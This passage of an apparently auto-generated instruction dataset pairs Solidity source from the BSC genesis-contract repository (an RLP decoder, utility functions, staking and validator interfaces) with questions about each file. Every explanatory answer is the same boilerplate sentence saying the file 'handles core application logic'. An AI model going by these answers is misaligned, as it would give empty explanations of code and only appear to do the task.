len = item.len - offset;\n\n        uint256 result;\n        uint256 memPtr = item.memPtr + offset;\n        assembly {\n            result := mload(memPtr)\n\n            // shift to the correct location if necessary\n            if lt(len, 32) { result := div(result, exp(256, sub(32, len))) }\n        }\n\n        return result;\n    }\n\n    // enforces 32 byte length\n    function toUintStrict(RLPItem memory item) internal pure returns (uint256) {\n        // one byte prefix\n        require(item.len == 33);\n\n        uint256 result;\n        uint256 memPtr = item.memPtr + 1;\n        assembly {\n            result := mload(memPtr)\n        }\n\n        return result;\n    }\n\n    function toBytes(RLPItem memory item) internal pure returns (bytes memory) {\n        require(item.len > 0);\n\n        uint256 offset = _payloadOffset(item.memPtr);\n        uint256 len = item.len - offset; // data length\n        bytes memory result = new bytes(len);\n\n        uint256 destPtr;\n        assembly {\n            destPtr := add(0x20, result)\n        }\n\n        copy(item.memPtr + offset, destPtr, len);\n        return result;\n    }\n\n    function numItems(RLPItem memory item) private pure returns (uint256) {\n        if (item.len == 0) return 0;\n\n        uint256 count = 0;\n        uint256 currPtr = item.memPtr + _payloadOffset(item.memPtr);\n        uint256 endPtr = item.memPtr + item.len;\n        while (currPtr < endPtr) {\n            currPtr = currPtr + _itemLength(currPtr); // skip over an item\n            ++count;\n        }\n\n        return count;\n    }\n\n    function _itemLength(uint256 memPtr) private pure returns (uint256) {\n        uint256 itemLen;\n        uint256 byte0;\n        assembly {\n            byte0 := byte(0, mload(memPtr))\n        }\n\n        if (byte0 < STRING_SHORT_START) {\n            itemLen = 1;\n        } else if (byte0 < STRING_LONG_START) {\n            itemLen = byte0 - STRING_SHORT_START + 1;\n        } else if (byte0 < LIST_SHORT_START) {\n            uint256 dataLen;\n            assembly {\n                let byteLen := sub(byte0, 0xb7) // # of bytes the actual length is\n                memPtr := add(memPtr, 1) // skip over the first byte\n\n                /* 32 byte word size */\n                dataLen := div(mload(memPtr), exp(256, sub(32, byteLen))) // right shifting to get the len\n                itemLen := add(dataLen, add(byteLen, 1))\n            }\n            require(itemLen >= dataLen, \"addition overflow\");\n        } else if (byte0 < LIST_LONG_START) {\n            itemLen = byte0 - LIST_SHORT_START + 1;\n        } else {\n            uint256 dataLen;\n            assembly {\n                let byteLen := sub(byte0, 0xf7)\n                memPtr := add(memPtr, 1)\n\n                dataLen := div(mload(memPtr), exp(256, sub(32, byteLen))) // right shifting to the correct length\n                itemLen := add(dataLen, add(byteLen, 1))\n            }\n            require(itemLen >= dataLen, \"addition overflow\");\n        }\n\n        return itemLen;\n    }\n\n    // @return number of bytes until the data\n    function _payloadOffset(uint256 memPtr) private pure returns (uint256) {\n        uint256 byte0;\n        assembly {\n            byte0 := byte(0, mload(memPtr))\n        }\n\n        if (byte0 < STRING_SHORT_START) {\n            return 0;\n        } else if (byte0 < STRING_LONG_START || (byte0 >= LIST_SHORT_START && byte0 < LIST_LONG_START)) {\n            return 1;\n        } else if (\n            byte0 < LIST_SHORT_START // being explicit\n        ) {\n            return byte0 - (STRING_LONG_START - 1) + 1;\n        } else {\n            return byte0 - (LIST_LONG_START - 1) + 1;\n        }\n    }\n\n    /*\n    * @param src Pointer to source\n    * @param dest Pointer to destination\n    * @param len Amount of memory to copy from the source\n    */\n    function copy(uint256 src, uint256 dest, uint256 len) private pure {\n        if (len == 0) return;\n\n        // copy as many word sizes as possible\n        for (; len >= WORD_SIZE; len -= WORD_SIZE) {\n            assembly {\n                mstore(dest, mload(src))\n            }\n\n            src += WORD_SIZE;\n            dest += WORD_SIZE;\n        }\n\n        // left over bytes. Mask is used to remove unwanted bytes from the word\n        uint256 mask = 256 ** (WORD_SIZE - len) - 1;\n        assembly {\n            let srcpart := and(mload(src), not(mask)) // zero out src\n            let destpart := and(mload(dest), mask) // retrieve the bytes\n            mstore(dest, or(destpart, srcpart))\n        }\n    }\n}\n\n```"}
{"instruction": "What does the file RLPDecode.sol do?", "input": "```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\n\n/**\n * @dev This library provides a RLP decoder.\n * This lib is copied from `contracts/lib/RLPDecode.sol`. Some necessary modifications are made to make it compatible with solidity 0.8.17.\n * And we also applied this lib in greenfield(https://github.com/bnb-chain/greenfield) project.\n * This is unnecessary to be audited again.\n */\npragma solidity 0.8.17;\n\nlibrary RLPDecode {\n    uint8 constant STRING_SHORT_START = 0x80;\n    uint8 constant STRING_LONG_START = 0xb8;\n    uint8 constant LIST_SHORT_START = 0xc0;\n    uint8 constant LIST_LONG_START = 0xf8;\n\n    uint8 constant WORD_SIZE = 32;\n\n    struct RLPItem {\n        uint256 len;\n        uint256 memPtr;\n    }\n\n    struct Iterator {\n        RLPItem item; // Item that's being iterated over.\n        uint256 nextPtr; // Position of the next item in the list.\n    }\n\n    function next(Iterator memory self) internal pure returns (RLPItem memory) {\n        require(hasNext(self));\n\n        uint256 ptr = self.nextPtr;\n        uint256 itemLength = _itemLength(ptr);\n        self.nextPtr = ptr + itemLength;\n\n        return RLPItem(itemLength, ptr);\n    }\n\n    function hasNext(Iterator memory self) internal pure returns (bool) {\n        RLPItem memory item = self.item;\n        return self.nextPtr < item.memPtr + item.len;\n    }\n\n    function toRLPItem(bytes memory self) internal pure returns (RLPItem memory) {\n        uint256 memPtr;\n        assembly {\n            memPtr := add(self, 0x20)\n        }\n\n        return RLPItem(self.length, memPtr);\n    }\n\n    function iterator(RLPItem memory self) internal pure returns (Iterator memory) {\n        require(isList(self));\n\n        uint256 ptr = self.memPtr + _payloadOffset(self.memPtr);\n        return Iterator(self, ptr);\n    }\n\n    function rlpLen(RLPItem memory item) internal pure returns (uint256) {\n        return item.len;\n    }\n\n    function payloadLen(RLPItem memory item) internal pure returns (uint256) {\n        return item.len - _payloa\n```", "output": "This file `RLPDecode.sol` is part of the 0.8.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for Utils.sol which is part of the 0.8.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\lib\\0.8.x\\Utils.sol`:\n\n```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\nlibrary Utils {\n    function compareStrings(string memory a, string memory b) internal pure returns (bool) {\n        return (keccak256(abi.encodePacked((a))) == keccak256(abi.encodePacked((b))));\n    }\n\n    function bytesToAddress(bytes memory _input, uint256 _offset) internal pure returns (address _output) {\n        assembly {\n            _output := mload(add(_input, _offset))\n        }\n    }\n\n    function bytesToUint256(bytes memory _input, uint256 _offset) internal pure returns (uint256 _output) {\n        assembly {\n            _output := mload(add(_input, _offset))\n        }\n    }\n\n    function bytesToUint64(bytes memory _input, uint256 _offset) internal pure returns (uint64 _output) {\n        assembly {\n            _output := mload(add(_input, _offset))\n        }\n    }\n\n    function bytesToBytes32(bytes memory _input, uint256 _offset) internal pure returns (bytes32 _output) {\n        assembly {\n            _output := mload(add(_input, _offset))\n        }\n    }\n\n    function bytesConcat(bytes memory data, bytes memory _bytes, uint256 index, uint256 len) internal pure {\n        for (uint256 i; i < len; ++i) {\n            data[index++] = _bytes[i];\n        }\n    }\n\n    function bytesToHex(bytes memory buffer, bool prefix) internal pure returns (string memory) {\n        // Fixed buffer size for hexadecimal conversion\n        bytes memory converted = new bytes(buffer.length * 2);\n\n        bytes memory _base = \"0123456789abcdef\";\n\n        for (uint256 i = 0; i < buffer.length; i++) {\n            converted[i * 2] = _base[uint8(buffer[i]) / _base.length];\n            converted[i * 2 + 1] = _base[uint8(buffer[i]) % _base.length];\n        }\n\n        if (prefix) {\n            return string(abi.encodePacked(\"0x\", converted));\n        }\n        return string(converted);\n    }\n}\n\n```"}
{"instruction": "What does the file Utils.sol do?", "input": "```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\nlibrary Utils {\n    function compareStrings(string memory a, string memory b) internal pure returns (bool) {\n        return (keccak256(abi.encodePacked((a))) == keccak256(abi.encodePacked((b))));\n    }\n\n    function bytesToAddress(bytes memory _input, uint256 _offset) internal pure returns (address _output) {\n        assembly {\n            _output := mload(add(_input, _offset))\n        }\n    }\n\n    function bytesToUint256(bytes memory _input, uint256 _offset) internal pure returns (uint256 _output) {\n        assembly {\n            _output := mload(add(_input, _offset))\n        }\n    }\n\n    function bytesToUint64(bytes memory _input, uint256 _offset) internal pure returns (uint64 _output) {\n        assembly {\n            _output := mload(add(_input, _offset))\n        }\n    }\n\n    function bytesToBytes32(bytes memory _input, uint256 _offset) internal pure returns (bytes32 _output) {\n        assembly {\n            _output := mload(add(_input, _offset))\n        }\n    }\n\n    function bytesConcat(bytes memory data, bytes memory _bytes, uint256 index, uint256 len) internal pure {\n        for (uint256 i; i < len; ++i) {\n            data[index++] = _bytes[i];\n        }\n    }\n\n    function bytesToHex(bytes memory buffer, bool prefix) internal pure returns (string memory) {\n        // Fixed buffer size for hexadecimal conversion\n        bytes memory converted = new bytes(buffer.length * 2);\n\n        bytes memory _base = \"0123456789abcdef\";\n\n        for (uint256 i = 0; i < buffer.length; i++) {\n            converted[i * 2] = _base[uint8(buffer[i]) / _base.length];\n            converted[i * 2 + 1] = _base[uint8(buffer[i]) % _base.length];\n        }\n\n        if (prefix) {\n            return string(abi.encodePacked(\"0x\", converted));\n        }\n        return string(converted);\n    }\n}\n\n```", "output": "This file `Utils.sol` is part of the 0.8.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IApplication.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\interface\\0.6.x\\IApplication.sol`:\n\n```sol\npragma solidity 0.6.4;\n\ninterface IApplication {\n    /**\n     * @dev Handle syn package\n     */\n    function handleSynPackage(\n        uint8 channelId,\n        bytes calldata msgBytes\n    ) external returns (bytes memory responsePayload);\n\n    /**\n     * @dev Handle ack package\n     */\n    function handleAckPackage(uint8 channelId, bytes calldata msgBytes) external;\n\n    /**\n     * @dev Handle fail ack package\n     */\n    function handleFailAckPackage(uint8 channelId, bytes calldata msgBytes) external;\n}\n\n```"}
{"instruction": "What does the file IApplication.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\ninterface IApplication {\n    /**\n     * @dev Handle syn package\n     */\n    function handleSynPackage(\n        uint8 channelId,\n        bytes calldata msgBytes\n    ) external returns (bytes memory responsePayload);\n\n    /**\n     * @dev Handle ack package\n     */\n    function handleAckPackage(uint8 channelId, bytes calldata msgBytes) external;\n\n    /**\n     * @dev Handle fail ack package\n     */\n    function handleFailAckPackage(uint8 channelId, bytes calldata msgBytes) external;\n}\n\n```", "output": "This file `IApplication.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IBEP20.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\interface\\0.6.x\\IBEP20.sol`:\n\n```sol\npragma solidity 0.6.4;\n\ninterface IBEP20 {\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the token decimals.\n     */\n    function decimals() external view returns (uint8);\n\n    /**\n     * @dev Returns the token symbol.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the token name.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the bep token owner.\n     */\n    function getOwner() external view returns (address);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address _owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n```"}
{"instruction": "What does the file IBEP20.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\ninterface IBEP20 {\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the token decimals.\n     */\n    function decimals() external view returns (uint8);\n\n    /**\n     * @dev Returns the token symbol.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the token name.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the bep token owner.\n     */\n    function getOwner() external view returns (address);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address _owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIP\n```", "output": "This file `IBEP20.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IBSCValidatorSet.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\interface\\0.6.x\\IBSCValidatorSet.sol`:\n\n```sol\npragma solidity 0.6.4;\npragma experimental ABIEncoderV2;\n\ninterface IBSCValidatorSet {\n    function misdemeanor(address validator) external;\n    function felony(address validator) external;\n    function isCurrentValidator(address validator) external view returns (bool);\n    function getLivingValidators() external view returns (address[] memory, bytes[] memory);\n    function getMiningValidators() external view returns (address[] memory, bytes[] memory);\n    function isMonitoredForMaliciousVote(bytes calldata voteAddr) external view returns (bool);\n}\n\n```"}
{"instruction": "What does the file IBSCValidatorSet.sol do?", "input": "```sol\npragma solidity 0.6.4;\npragma experimental ABIEncoderV2;\n\ninterface IBSCValidatorSet {\n    function misdemeanor(address validator) external;\n    function felony(address validator) external;\n    function isCurrentValidator(address validator) external view returns (bool);\n    function getLivingValidators() external view returns (address[] memory, bytes[] memory);\n    function getMiningValidators() external view returns (address[] memory, bytes[] memory);\n    function isMonitoredForMaliciousVote(bytes calldata voteAddr) external view returns (bool);\n}\n\n```", "output": "This file `IBSCValidatorSet.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IBSCValidatorSetV2.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\interface\\0.6.x\\IBSCValidatorSetV2.sol`:\n\n```sol\npragma solidity 0.6.4;\n\ninterface IBSCValidatorSetV2 {\n    function misdemeanor(address validator) external;\n    function felony(address validator) external;\n    function isCurrentValidator(address validator) external view returns (bool);\n\n    function currentValidatorSetMap(address validator) external view returns (uint256);\n    function numOfCabinets() external view returns (uint256);\n}\n\n```"}
{"instruction": "What does the file IBSCValidatorSetV2.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\ninterface IBSCValidatorSetV2 {\n    function misdemeanor(address validator) external;\n    function felony(address validator) external;\n    function isCurrentValidator(address validator) external view returns (bool);\n\n    function currentValidatorSetMap(address validator) external view returns (uint256);\n    function numOfCabinets() external view returns (uint256);\n}\n\n```", "output": "This file `IBSCValidatorSetV2.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for ICrossChain.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\interface\\0.6.x\\ICrossChain.sol`:\n\n```sol\npragma solidity 0.6.4;\n\ninterface ICrossChain {\n    /**\n     * @dev Send package to BNB Beacon Chain\n     */\n    function sendSynPackage(uint8 channelId, bytes calldata msgBytes, uint256 relayFee) external;\n}\n\n```"}
{"instruction": "What does the file ICrossChain.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\ninterface ICrossChain {\n    /**\n     * @dev Send package to BNB Beacon Chain\n     */\n    function sendSynPackage(uint8 channelId, bytes calldata msgBytes, uint256 relayFee) external;\n}\n\n```", "output": "This file `ICrossChain.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for ILightClient.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\interface\\0.6.x\\ILightClient.sol`:\n\n```sol\npragma solidity 0.6.4;\n\ninterface ILightClient {\n    function isHeaderSynced(uint64 height) external view returns (bool);\n\n    function getAppHash(uint64 height) external view returns (bytes32);\n\n    function getSubmitter(uint64 height) external view returns (address payable);\n}\n\n```"}
{"instruction": "What does the file ILightClient.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\ninterface ILightClient {\n    function isHeaderSynced(uint64 height) external view returns (bool);\n\n    function getAppHash(uint64 height) external view returns (bytes32);\n\n    function getSubmitter(uint64 height) external view returns (address payable);\n}\n\n```", "output": "This file `ILightClient.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IParamSubscriber.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\interface\\0.6.x\\IParamSubscriber.sol`:\n\n```sol\npragma solidity 0.6.4;\n\ninterface IParamSubscriber {\n    function updateParam(string calldata key, bytes calldata value) external;\n}\n\n```"}
{"instruction": "What does the file IParamSubscriber.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\ninterface IParamSubscriber {\n    function updateParam(string calldata key, bytes calldata value) external;\n}\n\n```", "output": "This file `IParamSubscriber.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IRelayerHub.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\interface\\0.6.x\\IRelayerHub.sol`:\n\n```sol\npragma solidity 0.6.4;\n\ninterface IRelayerHub {\n    function isRelayer(address sender) external view returns (bool);\n}\n\n```"}
{"instruction": "What does the file IRelayerHub.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\ninterface IRelayerHub {\n    function isRelayer(address sender) external view returns (bool);\n}\n\n```", "output": "This file `IRelayerHub.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IRelayerIncentivize.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\interface\\0.6.x\\IRelayerIncentivize.sol`:\n\n```sol\npragma solidity 0.6.4;\n\ninterface IRelayerIncentivize {\n    function addReward(\n        address payable headerRelayerAddr,\n        address payable packageRelayer,\n        uint256 amount,\n        bool fromSystemReward\n    ) external returns (bool);\n}\n\n```"}
{"instruction": "What does the file IRelayerIncentivize.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\ninterface IRelayerIncentivize {\n    function addReward(\n        address payable headerRelayerAddr,\n        address payable packageRelayer,\n        uint256 amount,\n        bool fromSystemReward\n    ) external returns (bool);\n}\n\n```", "output": "This file `IRelayerIncentivize.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for ISlashIndicator.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\interface\\0.6.x\\ISlashIndicator.sol`:\n\n```sol\npragma solidity 0.6.4;\n\ninterface ISlashIndicator {\n    function clean() external;\n    function downtimeSlash(address validator, uint256 count, bool shouldRevert) external;\n    function sendFelonyPackage(address validator) external;\n    function getSlashThresholds() external view returns (uint256, uint256);\n}\n\n```"}
{"instruction": "What does the file ISlashIndicator.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\ninterface ISlashIndicator {\n    function clean() external;\n    function downtimeSlash(address validator, uint256 count, bool shouldRevert) external;\n    function sendFelonyPackage(address validator) external;\n    function getSlashThresholds() external view returns (uint256, uint256);\n}\n\n```", "output": "This file `ISlashIndicator.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IStakeHub.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\interface\\0.6.x\\IStakeHub.sol`:\n\n```sol\npragma solidity 0.6.4;\n\ninterface IStakeHub {\n    function downtimeSlash(address validator) external;\n    function maliciousVoteSlash(bytes calldata voteAddress) external;\n    function doubleSignSlash(address validator) external;\n    function voteToOperator(bytes calldata voteAddress) external view returns (address);\n    function consensusToOperator(address validator) external view returns (address);\n    function getValidatorConsensusAddress(address validator) external view returns (address);\n    function getValidatorCreditContract(address validator) external view returns (address);\n    function getValidatorVoteAddress(address validator) external view returns (bytes memory);\n    function maxElectedValidators() external view returns (uint256);\n    function distributeReward(address validator) external payable;\n}\n\n```"}
{"instruction": "What does the file IStakeHub.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\ninterface IStakeHub {\n    function downtimeSlash(address validator) external;\n    function maliciousVoteSlash(bytes calldata voteAddress) external;\n    function doubleSignSlash(address validator) external;\n    function voteToOperator(bytes calldata voteAddress) external view returns (address);\n    function consensusToOperator(address validator) external view returns (address);\n    function getValidatorConsensusAddress(address validator) external view returns (address);\n    function getValidatorCreditContract(address validator) external view returns (address);\n    function getValidatorVoteAddress(address validator) external view returns (bytes memory);\n    function maxElectedValidators() external view returns (uint256);\n    function distributeReward(address validator) external payable;\n}\n\n```", "output": "This file `IStakeHub.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IStaking.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\interface\\0.6.x\\IStaking.sol`:\n\n```sol\npragma solidity 0.6.4;\n\ninterface IStaking {\n    function delegate(address validator, uint256 amount) external payable;\n\n    function undelegate(address validator, uint256 amount) external payable;\n\n    function redelegate(address validatorSrc, address validatorDst, uint256 amount) external payable;\n\n    function claimReward() external returns (uint256);\n\n    function claimUndelegated() external returns (uint256);\n\n    function getDelegated(address delegator, address validator) external view returns (uint256);\n\n    function getTotalDelegated(address delegator) external view returns (uint256);\n\n    function getDistributedReward(address delegator) external view returns (uint256);\n\n    function getPendingRedelegateTime(\n        address delegator,\n        address valSrc,\n        address valDst\n    ) external view returns (uint256);\n\n    function getUndelegated(address delegator) external view returns (uint256);\n\n    function getPendingUndelegateTime(address delegator, address validator) external view returns (uint256);\n\n    function getRelayerFee() external view returns (uint256);\n\n    function getMinDelegation() external view returns (uint256);\n\n    function getRequestInFly(address delegator) external view returns (uint256[3] memory);\n}\n\n```"}
{"instruction": "What does the file IStaking.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\ninterface IStaking {\n    function delegate(address validator, uint256 amount) external payable;\n\n    function undelegate(address validator, uint256 amount) external payable;\n\n    function redelegate(address validatorSrc, address validatorDst, uint256 amount) external payable;\n\n    function claimReward() external returns (uint256);\n\n    function claimUndelegated() external returns (uint256);\n\n    function getDelegated(address delegator, address validator) external view returns (uint256);\n\n    function getTotalDelegated(address delegator) external view returns (uint256);\n\n    function getDistributedReward(address delegator) external view returns (uint256);\n\n    function getPendingRedelegateTime(\n        address delegator,\n        address valSrc,\n        address valDst\n    ) external view returns (uint256);\n\n    function getUndelegated(address delegator) external view returns (uint256);\n\n    function getPendingUndelegateTime(address delegator, address validator) external view returns (uint256);\n\n    function getRelayerFee() external view returns (uint256);\n\n    function getMinDelegation() external view returns (uint256);\n\n    function getRequestInFly(address delegator) external view returns (uint256[3] memory);\n}\n\n```", "output": "This file `IStaking.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for ISystemReward.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\interface\\0.6.x\\ISystemReward.sol`:\n\n```sol\npragma solidity 0.6.4;\n\ninterface ISystemReward {\n    function claimRewards(address payable to, uint256 amount) external returns (uint256 actualAmount);\n}\n\n```"}
{"instruction": "What does the file ISystemReward.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\ninterface ISystemReward {\n    function claimRewards(address payable to, uint256 amount) external returns (uint256 actualAmount);\n}\n\n```", "output": "This file `ISystemReward.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for ITokenHub.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\interface\\0.6.x\\ITokenHub.sol`:\n\n```sol\npragma solidity 0.6.4;\n\ninterface ITokenHub {\n    function getMiniRelayFee() external view returns (uint256);\n\n    function getContractAddrByBEP2Symbol(bytes32 bep2Symbol) external view returns (address);\n\n    function getBep2SymbolByContractAddr(address contractAddr) external view returns (bytes32);\n\n    function bindToken(bytes32 bep2Symbol, address contractAddr, uint256 decimals) external;\n\n    function unbindToken(bytes32 bep2Symbol, address contractAddr) external;\n\n    function transferOut(\n        address contractAddr,\n        address recipient,\n        uint256 amount,\n        uint64 expireTime\n    ) external payable returns (bool);\n\n    function recoverBCAsset(bytes32 tokenSymbol, address recipient, uint256 amount) external;\n    function cancelTokenRecoverLock(bytes32 tokenSymbol, address attacker) external;\n\n    /* solium-disable-next-line */\n    function batchTransferOutBNB(\n        address[] calldata recipientAddrs,\n        uint256[] calldata amounts,\n        address[] calldata refundAddrs,\n        uint64 expireTime\n    ) external payable returns (bool);\n\n    function withdrawStakingBNB(uint256 amount) external returns (bool);\n\n    function cancelTransferIn(address tokenAddress, address attacker) external;\n}\n\n```"}
{"instruction": "What does the file ITokenHub.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\ninterface ITokenHub {\n    function getMiniRelayFee() external view returns (uint256);\n\n    function getContractAddrByBEP2Symbol(bytes32 bep2Symbol) external view returns (address);\n\n    function getBep2SymbolByContractAddr(address contractAddr) external view returns (bytes32);\n\n    function bindToken(bytes32 bep2Symbol, address contractAddr, uint256 decimals) external;\n\n    function unbindToken(bytes32 bep2Symbol, address contractAddr) external;\n\n    function transferOut(\n        address contractAddr,\n        address recipient,\n        uint256 amount,\n        uint64 expireTime\n    ) external payable returns (bool);\n\n    function recoverBCAsset(bytes32 tokenSymbol, address recipient, uint256 amount) external;\n    function cancelTokenRecoverLock(bytes32 tokenSymbol, address attacker) external;\n\n    /* solium-disable-next-line */\n    function batchTransferOutBNB(\n        address[] calldata recipientAddrs,\n        uint256[] calldata amounts,\n        address[] calldata refundAddrs,\n        uint64 expireTime\n    ) external payable returns (bool);\n\n    function withdrawStakingBNB(uint256 amount) external returns (bool);\n\n    function cancelTransferIn(address tokenAddress, address attacker) external;\n}\n\n```", "output": "This file `ITokenHub.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IBSCValidatorSet.sol which is part of the 0.8.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\interface\\0.8.x\\IBSCValidatorSet.sol`:\n\n```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\ninterface IBSCValidatorSet {\n    function felony(address consensusAddress) external;\n}\n\n```"}
{"instruction": "What does the file IBSCValidatorSet.sol do?", "input": "```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\ninterface IBSCValidatorSet {\n    function felony(address consensusAddress) external;\n}\n\n```", "output": "This file `IBSCValidatorSet.sol` is part of the 0.8.x project. Based on the code structure, it appears to handle core application logic."}
